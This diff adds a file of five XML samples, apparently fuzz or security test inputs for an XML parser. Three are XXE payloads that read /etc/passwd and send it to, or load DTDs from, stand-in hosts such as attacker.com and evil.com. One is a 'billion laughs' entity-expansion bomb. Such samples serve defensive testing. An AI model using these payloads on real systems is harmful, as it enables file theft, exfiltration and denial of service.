@@ -1,0 +1,62 @@
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?%xxe;'>">
+  %eval;
+]>
+<root>&exfiltrate;</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE doc [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<doc>&lol4;</doc>
+```
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE root SYSTEM "data:text/xml,<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;">
+<root>
+  <element attr="value">
+    <nested>
+      <deep>content</deep>
+    </nested>
+  </element>
+</root>
+```
+
+```xml
+<!DOCTYPE root [
+  <!ELEMENT root (child)*>
+  <!ELEMENT child (#PCDATA|grandchild)*>
+  <!ELEMENT grandchild EMPTY>
+  <!ATTLIST child id ID #REQUIRED>
+  <!ATTLIST child ref IDREF #IMPLIED>
+  <!NOTATION gif PUBLIC "GIF89a" "image/gif">
+  <!ENTITY pic SYSTEM "image.gif" NDATA gif>
+]>
+<root>
+  <child id="c1" ref="c2">Text &lt;unescaped&gt;</child>
+  <child id="c2"><grandchild/></child>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg SYSTEM "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root xmlns:x="http://example.com">
+  <x:data attr="%file;">
+    <![CDATA[Unclosed entity: &undefined;]]>
+  </x:data>
+</root>
+```
